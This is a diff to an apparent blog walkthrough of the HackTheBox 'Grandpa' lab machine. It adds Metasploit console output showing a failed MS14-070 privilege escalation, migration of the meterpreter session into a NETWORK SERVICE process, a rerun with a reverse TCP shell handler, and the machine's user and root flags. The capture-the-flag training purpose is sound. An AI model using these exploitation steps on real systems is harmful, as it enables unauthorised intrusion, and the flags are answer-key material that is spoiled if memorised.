@@ -2,7 +2,7 @@
 title: HackTheBox - Grandpa WriteUp
 date: 2025-07-22 15:30:00 +/-0100
 categories: [Machines] 
-tags: [CTF,HackTheBox]
+tags: [CTF,HackTheBox, IIS, Webdav]
 image: /assets/img/Machines/Grandpa/Grandpa.png  # SIZE 1200:630
 description: 
     This post documents my walkthrough of the Grandpa machine from Hack The Box. The machine exploits a known vulnerability in Microsoft IIS 6.0, specifically the WebDAV ScStoragePathFromUrl buffer overflow. The exploitation process involves identifying the outdated Windows Server 2003 system, leveraging a public Metasploit exploit to gain a reverse shell, perform Privilege Escalation, and then retrieving the user and root flags from the compromised system.
@@ -338,6 +338,48 @@ View the full module info with the info -d command.
 ```bash
 msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > run
 [*] Started reverse TCP handler on 10.10.14.16:4444 
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
+[*] Exploit completed, but no session was created.
+```
+
+- It appears that the current process lacks the necessary permissions, so I attempted to migrate to another process with higher privileges to gain broader system access.
+
+
+```bash
+
+msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions 1 
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System
+ 272   4     smss.exe
+ 320   272   csrss.exe
+ 344   272   winlogon.exe
+...
+...
+...
+ 1888  392   alg.exe
+ 1900  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 2232  344   logon.scr
+ 2304  1504  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 2400  584   wmiprvse.exe
+ 2736  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 2836  2304  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+ 3844  1072  cidaemon.exe
+
+meterpreter > migrate 1900
+[*] Migrating from 2836 to 1900...
+[*] Migration completed successfully.
+meterpreter > background 
+[*] Backgrounding session 1...
+
+msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > run
+[*] Started reverse TCP handler on 10.10.14.16:4444 
 [*] Storing the shellcode in memory...
 [*] Triggering the vulnerability...
 [*] Checking privileges after exploitation...
@@ -370,6 +412,7 @@ more root.txt
 9359e905a2c35f861f6a57cecf28bb7b
 
 ```
+
 User Flag → **`bdff5ec67c3cff017f2bedc146a5d869`**
 
 Root Flag → **`9359e905a2c35f861f6a57cecf28bb7b`** 
